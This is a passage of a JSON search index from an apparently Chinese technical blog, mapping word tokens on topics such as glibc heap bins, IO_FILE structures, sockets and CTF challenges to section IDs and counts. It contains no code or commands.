ip协议族通信的中间软件抽象层\",{\"1\":{\"434\":1}}],[\"ip协议的家族\",{\"1\":{\"433\":1}}],[\"ip\",{\"0\":{\"433\":1},\"1\":{\"261\":5,\"483\":3}}],[\"ip这样的方式直接访问内存\",{\"1\":{\"65\":1,\"205\":1}}],[\"ip寄存器\",{\"1\":{\"44\":1,\"184\":1}}],[\"ipc\",{\"1\":{\"13\":1,\"155\":1,\"258\":1}}],[\"i\",{\"1\":{\"43\":1,\"73\":1,\"123\":1,\"126\":3,\"131\":3,\"183\":1,\"213\":1,\"258\":1,\"281\":4,\"292\":7,\"324\":2,\"339\":1,\"358\":12,\"359\":8,\"373\":4,\"376\":5,\"378\":8,\"380\":16,\"459\":4,\"461\":3,\"462\":11,\"463\":2,\"464\":1,\"475\":12,\"480\":2,\"488\":16,\"491\":16,\"495\":4,\"498\":5,\"500\":8,\"502\":16,\"503\":43}}],[\"imbue\",{\"1\":{\"395\":6,\"401\":2}}],[\"immediately\",{\"1\":{\"352\":1}}],[\"implementation=function\",{\"1\":{\"121\":1,\"123\":2,\"124\":1}}],[\"implementations\",{\"1\":{\"121\":1,\"122\":1}}],[\"important\",{\"1\":{\"286\":1}}],[\"import\",{\"1\":{\"30\":1,\"125\":1,\"172\":1,\"243\":1,\"254\":1,\"358\":1,\"359\":1,\"369\":2,\"461\":1,\"463\":1,\"470\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":2,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":2,\"486\":1,\"488\":2,\"491\":1,\"503\":1,\"504\":2,\"505\":2}}],[\"images\",{\"1\":{\"258\":2}}],[\"image\",{\"0\":{\"260\":1},\"1\":{\"17\":1,\"60\":1,\"134\":1,\"136\":1,\"137\":1,\"138\":1,\"159\":1,\"200\":1,\"239\":2,\"240\":2,\"258\":2,\"276\":1,\"281\":2,\"301\":1,\"303\":2,\"306\":1,\"351\":1,\"362\":2,\"365\":2,\"366\":1,\"367\":2,\"368\":3,\"371\":4,\"373\":3,\"375\":1,\"376\":2,\"377\":1,\"378\":2,\"385\":1,\"386\":2,\"387\":3,\"389\":1,\"390\":1,\"392\":1,\"396\":1,\"405\":1,\"408\":2,\"411\":1,\"414\":3,\"417\":5,\"420\":4,\"424\":1,\"425\":1,\"431\":3,\"440\":2,\"473\":1,\"474\":4,\"477\":1,\"480\":1,\"482\":2,\"493\":4,\"495\":3,\"497\":1,\"498\":2,\"499\":1,\"500\":2}}],[\"img\",{\"1\":{\"16\":1,\"73\":1,\"134\":1,\"158\":1,\"213\":1,\"240\":1,\"273\":1,\"301\":1,\"302\":1,\"306\":1,\"433\":1,\"438\":1}}],[\"io函数函数的原理\",{\"0\":{\"402\":1}}],[\"io函数源码阅读\",{\"1\":{\"398\":1}}],[\"io调用链\",{\"0\":{\"61\":1,\"201\":1}}],[\"io\",{\"0\":{\"43\":1,\"183\":1,\"387\":1,\"389\":1,\"390\":1,\"391\":1,\"394\":1,\"395\":1,\"409\":1,\"423\":1,\"428\":1,\"429\":1,\"431\":1,\"517\":1},\"1\":{\"1\":2,\"22\":1,\"40\":2,\"43\":15,\"46\":2,\"49\":1,\"53\":1,\"59\":5,\"60\":1,\"164\":1,\"180\":2,\"183\":15,\"186\":2,\"189\":1,\"193\":1,\"199\":5,\"200\":1,\"254\":1,\"384\":4,\"385\":1,\"386\":1,\"387\":4,\"388\":2,\"389\":6,\"390\":18,\"391\":2,\"394\":5,\"395\":90,\"397\":13,\"398\":4,\"399\":3,\"400\":1,\"401\":21,\"402\":1,\"403\":25,\"407\":5,\"408\":40,\"410\":19,\"411\":1,\"413\":2,\"414\":1,\"416\":1,\"417\":16,\"419\":1,\"420\":3,\"421\":2,\"422\":1,\"426\":12,\"427\":2,\"428\":10,\"430\":2,\"431\":2,\"437\":2}}],[\"inc\",{\"1\":{\"483\":4}}],[\"include<unistd\",{\"1\":{\"397\":1}}],[\"include<stdint\",{\"1\":{\"397\":1}}],[\"include<stdio\",{\"1\":{\"397\":1,\"470\":1}}],[\"include<stdlib\",{\"1\":{\"290\":1,\"397\":1}}],[\"include\",{\"1\":{\"290\":1,\"397\":1,\"404\":2,\"431\":1,\"458\":1,\"462\":1}}],[\"input\",{\"1\":{\"459\":1,\"460\":2,\"461\":1,\"463\":1,\"475\":5,\"479\":1,\"481\":2,\"486\":2,\"488\":5,\"491\":1,\"503\":3,\"505\":1}}],[\"inline\",{\"1\":{\"428\":1,\"439\":2,\"441\":1,\"442\":1}}],[\"inserted\",{\"1\":{\"347\":1}}],[\"insert\",{\"1\":{\"321\":1}}],[\"instrumentation\",{\"1\":{\"131\":1}}],[\"install\",{\"0\":{\"108\":1},\"1\":{\"258\":1,\"262\":1}}],[\"inviisible\",{\"0\":{\"483\":1}}],[\"invocation\",{\"1\":{\"408\":2}}],[\"invalid\",{\"1\":{\"312\":3,\"324\":5,\"339\":2}}],[\"invert\",{\"1\":{\"243\":2}}],[\"inuse位\",{\"1\":{\"491\":1}}],[\"inuse变为0\",{\"1\":{\"368\":1}}],[\"inuse\",{\"1\":{\"305\":1,\"311\":1,\"312\":2,\"313\":2,\"315\":1,\"321\":3,\"324\":8,\"353\":1,\"368\":1}}],[\"inused这个位\",{\"1\":{\"55\":1,\"195\":1}}],[\"init源码\",{\"1\":{\"410\":1}}],[\"init中初始化\",{\"1\":{\"353\":1}}],[\"init的时候初始化的\",{\"1\":{\"351\":1}}],[\"init\",{\"0\":{\"409\":1},\"1\":{\"279\":1,\"349\":1,\"353\":2,\"358\":1,\"359\":1,\"395\":60,\"403\":4,\"410\":3,\"416\":1,\"417\":2,\"459\":4,\"464\":1}}],[\"initrd\",{\"1\":{\"73\":1,\"213\":1}}],[\"inrelease\",{\"1\":{\"261\":5}}],[\"index知道我们要绑定函数的名字\",{\"1\":{\"451\":1}}],[\"index5则可实现任意free\",{\"1\":{\"377\":1,\"499\":1}}],[\"index\",{\"0\":{\"451\":1},\"1\":{\"292\":1,\"305\":1,\"317\":1,\"318\":4,\"319\":4,\"324\":2,\"335\":1,\"339\":2,\"358\":11,\"359\":11,\"369\":6,\"380\":1,\"450\":1,\"451\":2,\"475\":10,\"480\":4,\"488\":10,\"491\":8,\"502\":1,\"503\":12}}],[\"indexof\",{\"1\":{\"126\":2,\"131\":1}}],[\"indicate\",{\"1\":{\"258\":2}}],[\"inetcache\",{\"1\":{\"131\":1}}],[\"int64\",{\"1\":{\"451\":1,\"459\":2}}],[\"into\",{\"1\":{\"324\":3,\"389\":1}}],[\"intruder\",{\"1\":{\"324\":1}}],[\"introduction\",{\"1\":{\"22\":1,\"164\":1}}],[\"int类型\",{\"1\":{\"292\":1}}],[\"intent\",{\"0\":{\"143\":1},\"1\":{\"143\":2,\"144\":2}}],[\"intent的各种action\",{\"1\":{\"140\":1}}],[\"intermittent\",{\"0\":{\"482\":1}}],[\"interpreter\",{\"1\":{\"456\":1}}],[\"interp那么就会将ld找到\",{\"1\":{\"454\":1}}],[\"interactive\",{\"1\":{\"358\":1,\"359\":1,\"369\":1,\"471\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"internal函数\",{\"1\":{\"417\":1}}],[\"internal\",{\"1\":{\"324\":3,\"347\":3,\"403\":2,\"408\":2,\"416\":1,\"417\":1}}],[\"internal然后调用对应的vtable函数\",{\"1\":{\"60\":1,\"200\":1}}],[\"interceptor\",{\"1\":{\"127\":1}}],[\"int这样定义是数组\",{\"1\":{\"23\":1,\"165\":1}}],[\"int这样定义是切片\",{\"1\":{\"23\":1,\"165\":1}}],[\"int\",{\"0\":{\"307\":1,\"324\":1,\"353\":1},\"1\":{\"20\":1,\"30\":2,\"43\":2,\"60\":1,\"123\":5,\"125\":3,\"162\":1,\"172\":2,\"183\":2,\"200\":1,\"254\":2,\"290\":4,\"292\":3,\"307\":1,\"324\":4,\"335\":1,\"336\":1,\"339\":2,\"347\":3,\"348\":1,\"350\":2,\"352\":2,\"353\":2,\"389\":2,\"404\":1,\"410\":2,\"431\":1,\"438\":7,\"439\":2,\"441\":1,\"442\":1,\"451\":1,\"458\":2,\"459\":2,\"462\":8,\"469\":1,\"470\":3,\"473\":2,\"479\":1,\"483\":3,\"491\":2,\"503\":3}}],[\"info高位3字节\",{\"1\":{\"451\":1}}],[\"info结构实现\",{\"1\":{\"346\":1}}],[\"information\",{\"1\":{\"131\":1,\"352\":1}}],[\"info的信息\",{\"1\":{\"36\":1,\"176\":1}}],[\"info信息\",{\"1\":{\"36\":1,\"176\":1}}],[\"info\",{\"1\":{\"13\":1,\"113\":1,\"131\":1,\"155\":1,\"324\":1,\"353\":3,\"438\":1,\"439\":3,\"442\":3,\"451\":6}}],[\"inode\",{\"1\":{\"13\":1,\"155\":1}}],[\"in\",{\"1\":{\"0\":1,\"279\":1,\"281\":2,\"305\":1,\"313\":2,\"318\":1,\"320\":1,\"321\":1,\"324\":6,\"342\":3,\"344\":1,\"347\":5,\"349\":1,\"353\":2,\"358\":3,\"359\":2,\"373\":2,\"376\":3,\"378\":4,\"380\":8,\"391\":1,\"408\":1,\"417\":3,\"428\":1,\"463\":2,\"467\":1,\"475\":6,\"480\":1,\"488\":8,\"491\":8,\"495\":2,\"498\":3,\"500\":4,\"502\":8,\"503\":23}}],[\"isoc99\",{\"1\":{\"470\":2}}],[\"isolation\",{\"1\":{\"74\":1,\"214\":1}}],[\"is32\",{\"1\":{\"403\":1,\"419\":1}}],[\"isused被设置为0\",{\"1\":{\"293\":1}}],[\"isused来判断是否存在的\",{\"1\":{\"293\":1}}],[\"isused\",{\"1\":{\"292\":1,\"371\":1,\"374\":1,\"377\":2,\"491\":2,\"493\":1,\"496\":1,\"499\":2}}],[\"issue\",{\"1\":{\"270\":1}}],[\"iscloseerror\",{\"1\":{\"255\":1}}],[\"istextwidgetactive\",{\"0\":{\"136\":1},\"1\":{\"134\":1,\"136\":1}}],[\"is\",{\"1\":{\"0\":1,\"131\":1,\"258\":2,\"286\":3,\"321\":1,\"324\":13,\"339\":2,\"347\":4,\"349\":1,\"352\":9,\"353\":3,\"391\":1,\"397\":1,\"410\":1,\"428\":2,\"470\":2}}],[\"b为fastbin\",{\"1\":{\"488\":1}}],[\"bss+520\",{\"1\":{\"505\":2}}],[\"bss+0x108\",{\"1\":{\"505\":1}}],[\"bss+0x100+0x44\",{\"1\":{\"486\":2}}],[\"bss+0x8\",{\"1\":{\"505\":1}}],[\"bss段\",{\"1\":{\"505\":1}}],[\"bss段标准输入输出流io地址信息\",{\"1\":{\"474\":1}}],[\"bss\",{\"1\":{\"473\":1,\"475\":3,\"486\":4,\"504\":4,\"505\":4}}],[\"before\",{\"1\":{\"342\":1,\"417\":1}}],[\"below\",{\"1\":{\"339\":1}}],[\"because\",{\"1\":{\"324\":1}}],[\"beyond\",{\"1\":{\"324\":1}}],[\"been\",{\"1\":{\"324\":3,\"339\":1,\"353\":1}}],[\"be\",{\"1\":{\"307\":1,\"321\":1,\"324\":2,\"352\":1,\"417\":1,\"469\":1}}],[\"bck<\",{\"1\":{\"319\":1}}],[\"bck是头\",{\"1\":{\"319\":1}}],[\"bck赋值\",{\"0\":{\"318\":1}}],[\"bck为unsortedbin的头\",{\"1\":{\"313\":1}}],[\"bck\",{\"1\":{\"305\":4,\"306\":1,\"310\":1,\"312\":2,\"313\":1,\"314\":2,\"317\":2,\"318\":5,\"319\":12,\"321\":5,\"324\":8,\"325\":4}}],[\"bk的低地址为0来让fd\",{\"1\":{\"365\":1}}],[\"bk都符合检查机制\",{\"1\":{\"363\":1}}],[\"bk都是指向的unsortedbin中第一个chunk\",{\"1\":{\"311\":1}}],[\"bk获取下一个chunk\",{\"1\":{\"344\":1}}],[\"bk构成的bins链\",{\"1\":{\"319\":1}}],[\"bk进行链接\",{\"1\":{\"308\":1}}],[\"bk链接chunk\",{\"1\":{\"308\":1}}],[\"bk去获取前面一个chunk的fd和后面一个chunk的bk\",{\"1\":{\"296\":1}}],[\"bk\",{\"1\":{\"295\":2,\"296\":4,\"308\":2,\"311\":1,\"319\":1,\"321\":1,\"324\":1,\"329\":2,\"344\":5,\"345\":6,\"358\":3,\"359\":3,\"365\":3,\"488\":1}}],[\"bd868465569400a6b9408050643e5949e8f2b8f5\",{\"1\":{\"274\":1}}],[\"bd86846\",{\"1\":{\"274\":1}}],[\"buf\",{\"0\":{\"431\":1},\"1\":{\"388\":2,\"389\":1,\"390\":2,\"391\":1,\"408\":7,\"410\":2,\"430\":2,\"431\":6}}],[\"buff\",{\"1\":{\"371\":2,\"372\":1,\"377\":2,\"388\":1,\"491\":3,\"493\":2,\"494\":1,\"499\":2,\"503\":4}}],[\"buffer\",{\"1\":{\"391\":1}}],[\"bufferpool\",{\"1\":{\"254\":1}}],[\"buffers\",{\"1\":{\"254\":1}}],[\"but\",{\"1\":{\"324\":1,\"342\":1,\"347\":1,\"352\":1}}],[\"builtin\",{\"1\":{\"296\":2,\"324\":10,\"339\":4,\"344\":1,\"345\":1,\"378\":1,\"500\":1}}],[\"bugku\",{\"1\":{\"483\":1}}],[\"bug\",{\"1\":{\"275\":1}}],[\"bugfix一般用于解决问题\",{\"1\":{\"268\":1}}],[\"b6f507652425\",{\"1\":{\"258\":3}}],[\"b64和\",{\"1\":{\"243\":1}}],[\"b可以选择自己需要什么消息\",{\"1\":{\"251\":1}}],[\"b是订阅者\",{\"1\":{\"251\":1}}],[\"b和c当然也得把对于数据刷新显示出来\",{\"1\":{\"250\":1}}],[\"big\",{\"1\":{\"352\":1}}],[\"bitmap\",{\"1\":{\"347\":1}}],[\"bits\",{\"1\":{\"311\":1,\"312\":1}}],[\"bit\",{\"1\":{\"305\":1,\"315\":1,\"321\":1,\"324\":3}}],[\"bionic\",{\"1\":{\"261\":5}}],[\"bilibili\",{\"1\":{\"250\":1}}],[\"binary\",{\"1\":{\"445\":1}}],[\"bin先被消耗掉\",{\"1\":{\"358\":1}}],[\"bin大小的chunk申请下来\",{\"1\":{\"357\":1}}],[\"bin是一个双向链表\",{\"1\":{\"357\":1}}],[\"bin是按照大小进行的排序\",{\"1\":{\"319\":1}}],[\"bin单个区间大小的链表长度最长为7个\",{\"1\":{\"357\":1}}],[\"binmapsize\",{\"1\":{\"347\":1}}],[\"binmap\",{\"1\":{\"347\":1}}],[\"bin上\",{\"1\":{\"347\":1}}],[\"bin合并free\",{\"1\":{\"330\":1}}],[\"bin无和是bin则遍历unsorted\",{\"1\":{\"330\":1}}],[\"bin找\",{\"1\":{\"330\":2}}],[\"bin链表的的头\",{\"1\":{\"321\":1}}],[\"bin则进行fwd和bck的赋值\",{\"1\":{\"318\":1}}],[\"bin的位置填满\",{\"1\":{\"358\":1}}],[\"bin的大小\",{\"1\":{\"357\":1}}],[\"bin的范围为\",{\"1\":{\"357\":1}}],[\"bin的链表\",{\"1\":{\"338\":1}}],[\"bin的chunk和top\",{\"1\":{\"358\":1}}],[\"bin的chunk\",{\"1\":{\"329\":1}}],[\"bin的头\",{\"1\":{\"321\":1}}],[\"bin的头部\",{\"1\":{\"308\":1,\"310\":1}}],[\"bin的入链操作\",{\"1\":{\"319\":1}}],[\"bin的相对位置\",{\"1\":{\"306\":1}}],[\"bin判断部分\",{\"1\":{\"305\":1}}],[\"bin里面\",{\"1\":{\"287\":1}}],[\"bin放满了\",{\"1\":{\"285\":1}}],[\"bin中第一个chunk的bk和最后一个chunk的fd都指向main\",{\"1\":{\"357\":1}}],[\"bin中的chunk\",{\"1\":{\"321\":1,\"358\":1}}],[\"bin中\",{\"1\":{\"284\":1}}],[\"bins等于30\",{\"1\":{\"438\":1}}],[\"bins是真正用来放置chunk双向链表的\",{\"1\":{\"347\":1}}],[\"bins是bins的高速缓冲区\",{\"1\":{\"347\":1}}],[\"bins和large\",{\"1\":{\"347\":2}}],[\"bins合并后的chunk都会进入unsorted\",{\"1\":{\"347\":1}}],[\"bins上\",{\"1\":{\"347\":1}}],[\"bins或者smallbin找\",{\"1\":{\"330\":1}}],[\"bins同理进行赋值\",{\"1\":{\"319\":1}}],[\"bins\",{\"1\":{\"284\":1,\"286\":2,\"287\":1,\"324\":2,\"342\":1,\"347\":6,\"438\":1}}],[\"bins中\",{\"1\":{\"284\":1}}],[\"bin\",{\"0\":{\"307\":1,\"334\":1},\"1\":{\"243\":1,\"258\":4,\"285\":1,\"305\":6,\"307\":1,\"317\":1,\"318\":3,\"319\":2,\"321\":3,\"324\":2,\"339\":1,\"347\":5,\"358\":1,\"376\":1,\"380\":3,\"439\":14,\"441\":8,\"442\":7,\"473\":1,\"485\":1,\"486\":1,\"491\":1,\"498\":1,\"502\":3,\"503\":5}}],[\"b=456\",{\"1\":{\"121\":1}}],[\"b=2\",{\"1\":{\"47\":1,\"187\":1}}],[\"bzimage种提取vmlinux\",{\"1\":{\"73\":1,\"213\":1}}],[\"bzimage\",{\"1\":{\"73\":1,\"213\":1}}],[\"byobu\",{\"1\":{\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"byref\",{\"1\":{\"459\":4,\"469\":1,\"470\":1}}],[\"byte漏洞\",{\"1\":{\"487\":1}}],[\"bytearray\",{\"1\":{\"484\":5}}],[\"bytes=\",{\"1\":{\"464\":1}}],[\"bytes\",{\"1\":{\"305\":1,\"313\":1,\"315\":1,\"322\":1,\"324\":1,\"351\":3,\"491\":3,\"503\":3,\"505\":2}}],[\"byte\",{\"0\":{\"487\":1},\"1\":{\"255\":1,\"410\":1,\"459\":1,\"461\":1}}],[\"by\",{\"0\":{\"345\":1},\"1\":{\"55\":1,\"195\":1,\"294\":1,\"300\":1,\"301\":1,\"324\":2,\"347\":2,\"353\":1,\"361\":1,\"365\":1,\"366\":1,\"391\":1,\"403\":3,\"480\":1,\"488\":1}}],[\"borders\",{\"1\":{\"324\":1}}],[\"bordering\",{\"1\":{\"324\":2}}],[\"boundaries\",{\"1\":{\"324\":1}}],[\"bootlin\",{\"1\":{\"331\":1}}],[\"booleans\",{\"1\":{\"347\":1}}],[\"bool\",{\"1\":{\"254\":2,\"324\":1,\"347\":1,\"352\":1}}],[\"book123\",{\"1\":{\"113\":1}}],[\"bookstack\",{\"1\":{\"50\":1,\"190\":1,\"436\":1,\"437\":1}}],[\"both\",{\"1\":{\"0\":1}}],[\"break\",{\"1\":{\"353\":1,\"460\":1,\"462\":5}}],[\"brk函数申请\",{\"1\":{\"330\":1}}],[\"brk函数\",{\"1\":{\"327\":1}}],[\"brk\",{\"1\":{\"327\":1}}],[\"br指令\",{\"1\":{\"48\":1,\"188\":1}}],[\"brvc3\",{\"1\":{\"40\":2,\"180\":2}}],[\"blacklist\",{\"1\":{\"463\":2}}],[\"blocks\",{\"1\":{\"347\":1}}],[\"block\",{\"1\":{\"324\":3}}],[\"blog~\",{\"1\":{\"398\":1}}],[\"bloghome\",{\"1\":{\"0\":1}}],[\"blog\",{\"0\":{\"0\":1},\"1\":{\"0\":2,\"1\":1,\"14\":1,\"40\":1,\"54\":1,\"156\":1,\"180\":1,\"194\":1,\"244\":1}}],[\"blr指令\",{\"1\":{\"48\":1,\"188\":1}}],[\"bl\",{\"1\":{\"47\":1,\"187\":1}}],[\"babygift\",{\"0\":{\"473\":1}}],[\"banana\",{\"1\":{\"467\":2}}],[\"bambooiii\",{\"1\":{\"398\":1}}],[\"barrier\",{\"1\":{\"349\":2,\"353\":2}}],[\"ba25a9d\",{\"1\":{\"274\":1}}],[\"bad\",{\"1\":{\"261\":7,\"417\":1}}],[\"badge\",{\"0\":{\"109\":1}}],[\"bash\",{\"1\":{\"258\":2}}],[\"baselibc\",{\"1\":{\"481\":2}}],[\"base和\",{\"1\":{\"431\":1}}],[\"base进行劫持\",{\"0\":{\"431\":1}}],[\"base\",{\"1\":{\"40\":1,\"127\":2,\"180\":1,\"347\":1,\"373\":2,\"378\":1,\"380\":10,\"390\":5,\"397\":6,\"408\":15,\"410\":5,\"426\":5,\"430\":1,\"473\":3,\"475\":5,\"479\":8,\"488\":23,\"491\":9,\"495\":2,\"500\":1,\"502\":10,\"503\":34}}],[\"backdoor\",{\"1\":{\"397\":5,\"480\":2}}],[\"backdoor地址之类的\",{\"1\":{\"388\":1}}],[\"backup\",{\"1\":{\"390\":2,\"408\":4,\"410\":1}}],[\"backing\",{\"1\":{\"390\":1,\"408\":1}}],[\"backward\",{\"1\":{\"324\":1}}],[\"backports\",{\"1\":{\"261\":1}}],[\"backtrace\",{\"1\":{\"134\":2,\"136\":1}}],[\"background\",{\"0\":{\"107\":1}}],[\"baidu\",{\"1\":{\"44\":1,\"184\":1,\"261\":2}}],[\"bpf就是在内核层起了一层虚拟机\",{\"1\":{\"41\":1,\"181\":1}}],[\"bpf\",{\"0\":{\"41\":1,\"181\":1}}],[\"b\",{\"1\":{\"37\":1,\"121\":3,\"123\":1,\"177\":1,\"242\":5,\"243\":5,\"358\":15,\"359\":15,\"365\":1,\"367\":2,\"368\":1,\"369\":7,\"373\":2,\"376\":5,\"377\":1,\"378\":4,\"380\":11,\"464\":1,\"471\":3,\"473\":13,\"475\":16,\"479\":9,\"480\":13,\"481\":8,\"482\":8,\"483\":12,\"484\":7,\"485\":2,\"486\":12,\"488\":18,\"491\":26,\"495\":2,\"498\":5,\"499\":1,\"500\":4,\"502\":11,\"503\":56,\"504\":5,\"505\":5}}],[\"srop+orw\",{\"1\":{\"505\":1}}],[\"srop\",{\"0\":{\"505\":1}}],[\"sz然后必须<=av\",{\"1\":{\"339\":1}}],[\"sz不能大于av\",{\"1\":{\"312\":1}}],[\"sz\",{\"1\":{\"289\":1,\"312\":2,\"324\":5,\"339\":3}}],[\"skill\",{\"0\":{\"521\":1}}],[\"skip\",{\"1\":{\"321\":1}}],[\"skipper\",{\"1\":{\"252\":1}}],[\"skysider\",{\"1\":{\"259\":1,\"260\":1}}],[\"switch\",{\"1\":{\"258\":1,\"462\":1}}],[\"switching\",{\"1\":{\"258\":1}}],[\"sd\",{\"1\":{\"369\":1,\"473\":2,\"475\":2,\"479\":2,\"480\":3,\"481\":3,\"482\":2,\"483\":3,\"484\":1,\"486\":3,\"488\":2,\"491\":2,\"503\":2,\"504\":3,\"505\":3}}],[\"sdp\",{\"1\":{\"252\":1}}],[\"sdk版本\",{\"1\":{\"141\":1}}],[\"so的man手册\",{\"1\":{\"452\":1}}],[\"socket\",{\"1\":{\"435\":1}}],[\"socket的存在将大量的复杂网络通讯协议等隐藏了起来\",{\"1\":{\"434\":1}}],[\"socket的加入\",{\"0\":{\"434\":1}}],[\"socket是传输层的协议\",{\"1\":{\"434\":1}}],[\"socket是应用层与tcp\",{\"1\":{\"434\":1}}],[\"socket通讯原理及例程\",{\"1\":{\"432\":1}}],[\"socket通讯\",{\"0\":{\"432\":1},\"1\":{\"42\":1,\"182\":1}}],[\"source\",{\"1\":{\"331\":1}}],[\"some\",{\"1\":{\"324\":2}}],[\"so中\",{\"1\":{\"284\":1}}],[\"so中的函数\",{\"0\":{\"127\":1}}],[\"so\",{\"1\":{\"127\":5,\"131\":1,\"321\":1,\"324\":2,\"327\":1,\"342\":1,\"352\":1,\"353\":1,\"369\":2,\"422\":1,\"452\":1,\"453\":1,\"455\":1,\"456\":3}}],[\"so名称\",{\"1\":{\"127\":1}}],[\"softreference来进行引用\",{\"1\":{\"82\":1,\"222\":1}}],[\"smap\",{\"1\":{\"74\":1,\"214\":1}}],[\"smallbin的fwd\",{\"0\":{\"318\":1}}],[\"smallbin\",{\"0\":{\"58\":1,\"198\":1},\"1\":{\"305\":3,\"313\":2,\"318\":2,\"320\":1,\"321\":1,\"324\":1,\"344\":1,\"347\":1}}],[\"small\",{\"0\":{\"317\":1,\"439\":1},\"1\":{\"50\":1,\"190\":1,\"318\":1,\"344\":1,\"347\":3,\"438\":1,\"439\":3,\"441\":2,\"442\":1}}],[\"smep与smap这两个都是通过cr4寄存器来进行判断开启关闭的\",{\"1\":{\"74\":1,\"214\":1}}],[\"smep\",{\"1\":{\"74\":1,\"214\":1}}],[\"syscall+bytes\",{\"1\":{\"505\":2}}],[\"syscall\",{\"1\":{\"483\":2,\"505\":4}}],[\"systrim\",{\"1\":{\"324\":1}}],[\"system\",{\"1\":{\"73\":1,\"124\":1,\"125\":2,\"131\":1,\"213\":1,\"258\":2,\"324\":1,\"339\":1,\"347\":3,\"352\":1,\"353\":1,\"380\":5,\"404\":1,\"463\":1,\"469\":1,\"473\":2,\"475\":7,\"479\":3,\"491\":4,\"502\":5}}],[\"sym\",{\"1\":{\"451\":2}}],[\"sync\",{\"1\":{\"395\":9,\"401\":2}}],[\"synchronize\",{\"1\":{\"349\":1,\"353\":1}}],[\"sync指针调整为setcontext+61触发rdx到寄存器的赋值\",{\"1\":{\"59\":1,\"199\":1}}],[\"sync指针\",{\"1\":{\"59\":1,\"199\":1}}],[\"syntax\",{\"1\":{\"87\":1,\"227\":1}}],[\"screen\",{\"1\":{\"464\":1}}],[\"sched\",{\"1\":{\"352\":1}}],[\"scache中查找文件\",{\"1\":{\"453\":1}}],[\"scanf和fmt类似\",{\"1\":{\"476\":1}}],[\"scanf\",{\"1\":{\"290\":1,\"431\":2,\"470\":3}}],[\"scarificed\",{\"1\":{\"14\":1,\"156\":1}}],[\"score\",{\"1\":{\"69\":3,\"209\":3}}],[\"save\",{\"1\":{\"390\":2,\"408\":6,\"410\":2}}],[\"sa\",{\"1\":{\"369\":2,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"same\",{\"1\":{\"324\":1,\"339\":1}}],[\"sample\",{\"1\":{\"39\":1,\"179\":1}}],[\"sassertion\",{\"1\":{\"60\":1,\"200\":1}}],[\"sleep\",{\"1\":{\"480\":1,\"488\":1,\"504\":1,\"505\":1}}],[\"slow\",{\"1\":{\"428\":1,\"439\":1,\"441\":1}}],[\"slot里面\",{\"1\":{\"441\":1}}],[\"slot就是一些固定大小的slot链表\",{\"1\":{\"50\":1,\"190\":1}}],[\"slot\",{\"1\":{\"50\":2,\"190\":2,\"438\":6,\"439\":10,\"441\":7,\"442\":5}}],[\"sla\",{\"1\":{\"369\":7,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"sl\",{\"1\":{\"369\":1,\"380\":1,\"473\":4,\"475\":5,\"479\":2,\"480\":4,\"481\":1,\"482\":1,\"483\":1,\"484\":9,\"486\":1,\"488\":10,\"491\":9,\"502\":1,\"503\":13,\"504\":1,\"505\":1}}],[\"slice\",{\"1\":{\"491\":2}}],[\"slice2\",{\"1\":{\"30\":2,\"172\":2}}],[\"slices4\",{\"1\":{\"30\":2,\"172\":2}}],[\"slices3\",{\"1\":{\"30\":2,\"172\":2}}],[\"slices1\",{\"1\":{\"30\":4,\"172\":4}}],[\"split\",{\"1\":{\"347\":1}}],[\"special\",{\"1\":{\"270\":1}}],[\"specified\",{\"1\":{\"258\":2}}],[\"spawned\",{\"1\":{\"131\":1}}],[\"spawn\",{\"1\":{\"131\":1}}],[\"space\",{\"1\":{\"74\":1,\"214\":1,\"324\":2,\"352\":1,\"464\":1}}],[\"sp\",{\"1\":{\"47\":4,\"187\":4,\"369\":1,\"473\":1,\"475\":1,\"479\":1,\"480\":1,\"481\":1,\"482\":1,\"483\":1,\"484\":1,\"485\":1,\"486\":1,\"488\":1,\"491\":1,\"503\":1,\"504\":1,\"505\":1}}],[\"support\",{\"1\":{\"347\":1,\"390\":1,\"408\":1}}],[\"supervisor\",{\"1\":{\"74\":2,\"214\":2}}],[\"succeeds\",{\"1\":{\"342\":1}}],[\"sure\",{\"1\":{\"324\":1,\"389\":1}}],[\"surrounding\",{\"1\":{\"324\":1}}],[\"sudo\",{\"1\":{\"73\":1,\"213\":1}}],[\"subprotocols\",{\"1\":{\"254\":1}}],[\"sub\",{\"1\":{\"47\":2,\"187\":2,\"459\":1,\"460\":1,\"473\":1,\"483\":2}}],[\"submit也就是要提交的事件数量\",{\"1\":{\"43\":1,\"183\":1}}],[\"submit\",{\"1\":{\"43\":2,\"183\":2}}],[\"summary\",{\"1\":{\"40\":2,\"180\":2}}],[\"sq也就是存放用户提交的io请求\",{\"1\":{\"43\":1,\"183\":1}}],[\"sq\",{\"1\":{\"43\":1,\"183\":1}}],[\"simple\",{\"0\":{\"505\":1}}],[\"simultaneous\",{\"1\":{\"14\":1,\"156\":1}}],[\"siscn\",{\"0\":{\"469\":1}}],[\"since\",{\"1\":{\"352\":1}}],[\"single\",{\"1\":{\"324\":3,\"353\":1}}],[\"size和fd\",{\"1\":{\"365\":1}}],[\"size=0xa8\",{\"1\":{\"358\":1,\"359\":1}}],[\"size==\",{\"1\":{\"319\":1}}],[\"sized\",{\"1\":{\"353\":1}}],[\"sizeof\",{\"1\":{\"353\":4,\"389\":3,\"403\":1,\"407\":1,\"438\":2,\"439\":1,\"442\":1}}],[\"size来定的\",{\"1\":{\"345\":1}}],[\"size来存东西\",{\"1\":{\"289\":1}}],[\"size是否等于这个size\",{\"1\":{\"344\":1}}],[\"size是否与p的大小相同\",{\"1\":{\"296\":1}}],[\"size检查\",{\"1\":{\"339\":1}}],[\"size有且仅当\",{\"1\":{\"329\":1}}],[\"size+size\",{\"1\":{\"339\":1}}],[\"size+size+fd+data\",{\"1\":{\"329\":1}}],[\"size+sz<size<system\",{\"1\":{